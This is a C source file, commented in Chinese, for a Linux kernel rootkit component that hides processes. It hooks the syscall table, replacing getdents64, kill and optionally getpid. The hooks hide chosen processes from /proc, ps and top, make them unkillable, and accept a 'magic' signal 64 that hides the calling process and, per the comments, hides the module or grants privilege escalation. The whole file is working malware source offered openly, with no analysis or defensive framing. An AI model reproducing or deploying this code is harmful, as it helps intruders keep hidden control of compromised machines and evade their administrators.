/*
 * Advanced Process Hiding Implementation
 * Provides multiple methods to hide processes from detection
 * Kernel Version: 5.15.142
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/rcupdate.h>

#define MAX_HIDDEN_PROCS 500
#define HIDE_PREFIX "rk_"
#define MAGIC_PROC_NAME "rootkit_proc"

// 隐藏进程结构
struct hidden_proc {
    pid_t pid;                    // 进程ID
    char comm[TASK_COMM_LEN];     // 进程名
    int hide_type;                // 隐藏类型
    unsigned long hide_flags;     // 隐藏标志
    struct list_head list;        // 链表节点
};

// 隐藏类型枚举
enum proc_hide_type {
    HIDE_BY_PID,           // 按PID隐藏
    HIDE_BY_NAME,          // 按进程名隐藏
    HIDE_BY_PREFIX,        // 按前缀隐藏
    HIDE_BY_PARENT,        // 按父进程隐藏
    HIDE_BY_UID,           // 按用户ID隐藏
    HIDE_BY_CMDLINE        // 按命令行隐藏
};

// 隐藏标志
#define HIDE_FROM_PS        0x01    // 从ps命令隐藏
#define HIDE_FROM_PROC      0x02    // 从/proc隐藏
#define HIDE_FROM_TOP       0x04    // 从top命令隐藏
#define HIDE_FROM_KILL      0x08    // 从kill命令隐藏
#define HIDE_FROM_ALL       0xFF    // 从所有地方隐藏

// 全局变量
static LIST_HEAD(hidden_procs_list);
static DEFINE_MUTEX(hidden_procs_mutex);
static int hidden_procs_count = 0;

// 原始系统调用指针
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_kill)(const struct pt_regs *);
static asmlinkage long (*original_getpid)(const struct pt_regs *);
static asmlinkage long (*original_getppid)(const struct pt_regs *);
static asmlinkage long (*original_getpgid)(const struct pt_regs *);

// 外部变量
extern unsigned long *sys_call_table;
extern void disable_write_protection(void);
extern void enable_write_protection(void);

// 函数声明
static int is_hidden_proc(pid_t pid, const char *comm);
static int add_hidden_proc(pid_t pid, const char *comm, enum proc_hide_type type, unsigned long flags);
static int remove_hidden_proc(pid_t pid);
static void clear_hidden_procs(void);
static int should_hide_from_proc(pid_t pid);
static int should_hide_from_kill(pid_t pid);
static struct task_struct *find_hidden_task(pid_t pid);

// 检查进程是否应该被隐藏
static int is_hidden_proc(pid_t pid, const char *comm) {
    struct hidden_proc *hp;
    int result = 0;
    
    // 检查默认隐藏前缀
    if (comm && strncmp(comm, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
        return 1;
    }
    
    // 检查魔术进程名
    if (comm && strcmp(comm, MAGIC_PROC_NAME) == 0) {
        return 1;
    }
    
    mutex_lock(&hidden_procs_mutex);
    
    list_for_each_entry(hp, &hidden_procs_list, list) {
        switch (hp->hide_type) {
            case HIDE_BY_PID:
                if (hp->pid == pid) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_NAME:
                if (comm && strcmp(hp->comm, comm) == 0) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_PREFIX:
                if (comm && strncmp(comm, hp->comm, strlen(hp->comm)) == 0) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_PARENT: {
                struct task_struct *task;
                rcu_read_lock();
                task = pid_task(find_vpid(pid), PIDTYPE_PID);
                if (task && task->real_parent && task->real_parent->pid == hp->pid) {
                    result = 1;
                    rcu_read_unlock();
                    goto unlock;
                }
                rcu_read_unlock();
                break;
            }
            
            case HIDE_BY_UID: {
                struct task_struct *task;
                const struct cred *cred;
                rcu_read_lock();
                task = pid_task(find_vpid(pid), PIDTYPE_PID);
                if (task) {
                    cred = __task_cred(task);
                    if (cred && uid_eq(cred->uid, KUIDT_INIT(hp->pid))) {
                        result = 1;
                        rcu_read_unlock();
                        goto unlock;
                    }
                }
                rcu_read_unlock();
                break;
            }
            
            default:
                break;
        }
    }
    
unlock:
    mutex_unlock(&hidden_procs_mutex);
    return result;
}

// 添加隐藏进程
static int add_hidden_proc(pid_t pid, const char *comm, enum proc_hide_type type, unsigned long flags) {
    struct hidden_proc *hp;
    
    if (hidden_procs_count >= MAX_HIDDEN_PROCS) {
        return -EINVAL;
    }
    
    hp = kmalloc(sizeof(struct hidden_proc), GFP_KERNEL);
    if (!hp) {
        return -ENOMEM;
    }
    
    hp->pid = pid;
    hp->hide_type = type;
    hp->hide_flags = flags;
    
    if (comm) {
        strncpy(hp->comm, comm, TASK_COMM_LEN - 1);
        hp->comm[TASK_COMM_LEN - 1] = '\0';
    } else {
        hp->comm[0] = '\0';
    }
    
    mutex_lock(&hidden_procs_mutex);
    list_add_tail(&hp->list, &hidden_procs_list);
    hidden_procs_count++;
    mutex_unlock(&hidden_procs_mutex);
    
    printk(KERN_INFO "[rootkit] Process hidden: PID=%d, COMM=%s, TYPE=%d\n", 
           pid, comm ? comm : "<unknown>", type);
    
    return 0;
}

// 移除隐藏进程
static int remove_hidden_proc(pid_t pid) {
    struct hidden_proc *hp, *tmp;
    int removed = 0;
    
    mutex_lock(&hidden_procs_mutex);
    
    list_for_each_entry_safe(hp, tmp, &hidden_procs_list, list) {
        if (hp->pid == pid) {
            list_del(&hp->list);
            kfree(hp);
            hidden_procs_count--;
            removed = 1;
            break;
        }
    }
    
    mutex_unlock(&hidden_procs_mutex);
    
    if (removed) {
        printk(KERN_INFO "[rootkit] Process unhidden: PID=%d\n", pid);
    }
    
    return removed ? 0 : -ENOENT;
}

// 清空隐藏进程列表
static void clear_hidden_procs(void) {
    struct hidden_proc *hp, *tmp;
    
    mutex_lock(&hidden_procs_mutex);
    
    list_for_each_entry_safe(hp, tmp, &hidden_procs_list, list) {
        list_del(&hp->list);
        kfree(hp);
    }
    
    hidden_procs_count = 0;
    mutex_unlock(&hidden_procs_mutex);
    
    printk(KERN_INFO "[rootkit] All hidden processes cleared\n");
}

// 检查是否应该从/proc中隐藏
static int should_hide_from_proc(pid_t pid) {
    struct hidden_proc *hp;
    int result = 0;
    
    mutex_lock(&hidden_procs_mutex);
    
    list_for_each_entry(hp, &hidden_procs_list, list) {
        if (hp->pid == pid && (hp->hide_flags & HIDE_FROM_PROC)) {
            result = 1;
            break;
        }
    }
    
    mutex_unlock(&hidden_procs_mutex);
    return result;
}

// 检查是否应该从kill命令隐藏
static int should_hide_from_kill(pid_t pid) {
    struct hidden_proc *hp;
    int result = 0;
    
    mutex_lock(&hidden_procs_mutex);
    
    list_for_each_entry(hp, &hidden_procs_list, list) {
        if (hp->pid == pid && (hp->hide_flags & HIDE_FROM_KILL)) {
            result = 1;
            break;
        }
    }
    
    mutex_unlock(&hidden_procs_mutex);
    return result;
}

// 查找隐藏的任务结构
static struct task_struct *find_hidden_task(pid_t pid) {
    struct task_struct *task;
    
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        get_task_struct(task);
    }
    rcu_read_unlock();
    
    return task;
}

// Hook getdents64 系统调用（隐藏/proc中的进程目录）
static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret;
    pid_t pid;
    
    ret = original_getdents64(regs);
    if (ret <= 0) {
        return ret;
    }
    
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker) {
        return ret;
    }
    
    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        // 检查是否为数字目录名（进程PID）
        if (current_dir->d_name[0] >= '0' && current_dir->d_name[0] <= '9') {
            pid = simple_strtoul(current_dir->d_name, NULL, 10);
            
            // 检查是否需要隐藏此进程
            if (is_hidden_proc(pid, NULL) || should_hide_from_proc(pid)) {
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                } else {
                    previous_dir->d_reclen += current_dir->d_reclen;
                }
            } else {
                previous_dir = current_dir;
            }
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    kfree(dirent_ker);
    return ret;
}

// Hook kill 系统调用
static asmlinkage long hooked_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    
    // 检查是否为隐藏进程
    if (should_hide_from_kill(pid)) {
        return -ESRCH; // 进程不存在
    }
    
    // 魔术信号处理（rootkit控制）
    if (sig == 64) {
        switch (pid) {
            case 1: // 隐藏模块
            case 2: // 显示模块
            case 3: // 提权
                // 这些由主模块处理
                break;
            case 10: // 隐藏当前进程
                add_hidden_proc(current->pid, current->comm, HIDE_BY_PID, HIDE_FROM_ALL);
                return 0;
            case 11: // 显示当前进程
                remove_hidden_proc(current->pid);
                return 0;
            default:
                break;
        }
    }
    
    return original_kill(regs);
}

// Hook getpid 系统调用（可选：返回假PID）
static asmlinkage long hooked_getpid(const struct pt_regs *regs) {
    pid_t real_pid = current->pid;
    
    // 如果当前进程被隐藏，可以返回一个假PID
    if (is_hidden_proc(real_pid, current->comm)) {
        // 返回一个看起来正常的PID
        return 1; // 或者其他策略
    }
    
    return original_getpid(regs);
}

// 公共接口函数
int hide_process_by_pid(pid_t pid) {
    struct task_struct *task;
    const char *comm = NULL;
    
    task = find_hidden_task(pid);
    if (task) {
        comm = task->comm;
        put_task_struct(task);
    }
    
    return add_hidden_proc(pid, comm, HIDE_BY_PID, HIDE_FROM_ALL);
}

int hide_process_by_name(const char *name) {
    return add_hidden_proc(0, name, HIDE_BY_NAME, HIDE_FROM_ALL);
}

int hide_process_by_prefix(const char *prefix) {
    return add_hidden_proc(0, prefix, HIDE_BY_PREFIX, HIDE_FROM_ALL);
}

int hide_current_process(void) {
    return add_hidden_proc(current->pid, current->comm, HIDE_BY_PID, HIDE_FROM_ALL);
}

int unhide_process(pid_t pid) {
    return remove_hidden_proc(pid);
}

int get_hidden_procs_count(void) {
    return hidden_procs_count;
}

void get_hidden_procs_info(char *buffer, size_t size) {
    struct hidden_proc *hp;
    int offset = 0;
    const char *type_names[] = {
        "PID", "NAME", "PREFIX", "PARENT", "UID", "CMDLINE"
    };
    
    offset += snprintf(buffer + offset, size - offset,
                      "Hidden Processes (%d/%d):\n",
                      hidden_procs_count, MAX_HIDDEN_PROCS);
    
    mutex_lock(&hidden_procs_mutex);
    
    list_for_each_entry(hp, &hidden_procs_list, list) {
        if (offset >= size - 100) break;
        
        offset += snprintf(buffer + offset, size - offset,
                          "  PID: %d, COMM: %s, TYPE: %s, FLAGS: 0x%lx\n",
                          hp->pid,
                          hp->comm[0] ? hp->comm : "<any>",
                          type_names[hp->hide_type],
                          hp->hide_flags);
    }
    
    mutex_unlock(&hidden_procs_mutex);
}

// 批量隐藏进程（按父进程）
int hide_children_of_process(pid_t parent_pid) {
    struct task_struct *parent, *child;
    int count = 0;
    
    rcu_read_lock();
    
    parent = pid_task(find_vpid(parent_pid), PIDTYPE_PID);
    if (!parent) {
        rcu_read_unlock();
        return -ESRCH;
    }
    
    list_for_each_entry(child, &parent->children, sibling) {
        if (add_hidden_proc(child->pid, child->comm, HIDE_BY_PID, HIDE_FROM_ALL) == 0) {
            count++;
        }
    }
    
    rcu_read_unlock();
    
    printk(KERN_INFO "[rootkit] Hidden %d child processes of PID %d\n", count, parent_pid);
    return count;
}

// 初始化进程隐藏子系统
int init_process_hiding(void) {
    if (!sys_call_table) {
        printk(KERN_ERR "[rootkit] System call table not available\n");
        return -1;
    }
    
    // 保存原始系统调用
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_kill = (void *)sys_call_table[__NR_kill];
    original_getpid = (void *)sys_call_table[__NR_getpid];
    
    // Hook系统调用
    disable_write_protection();
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    // 可选：Hook getpid
    // sys_call_table[__NR_getpid] = (unsigned long)hooked_getpid;
    enable_write_protection();
    
    printk(KERN_INFO "[rootkit] Process hiding subsystem initialized\n");
    printk(KERN_INFO "[rootkit] Default hide prefix: %s\n", HIDE_PREFIX);
    printk(KERN_INFO "[rootkit] Magic process name: %s\n", MAGIC_PROC_NAME);
    
    return 0;
}

// 清理进程隐藏子系统
void cleanup_process_hiding(void) {
    // 恢复原始系统调用
    if (sys_call_table) {
        disable_write_protection();
        if (original_getdents64)
            sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        if (original_kill)
            sys_call_table[__NR_kill] = (unsigned long)original_kill;
        if (original_getpid)
            sys_call_table[__NR_getpid] = (unsigned long)original_getpid;
        enable_write_protection();
    }
    
    // 清理隐藏进程列表
    clear_hidden_procs();
    
    printk(KERN_INFO "[rootkit] Process hiding subsystem cleaned up\n");
}

// 导出符号
EXPORT_SYMBOL(hide_process_by_pid);
EXPORT_SYMBOL(hide_process_by_name);
EXPORT_SYMBOL(hide_process_by_prefix);
EXPORT_SYMBOL(hide_current_process);
EXPORT_SYMBOL(unhide_process);
EXPORT_SYMBOL(get_hidden_procs_count);
EXPORT_SYMBOL(get_hidden_procs_info);
EXPORT_SYMBOL(hide_children_of_process);
EXPORT_SYMBOL(init_process_hiding);
EXPORT_SYMBOL(cleanup_process_hiding);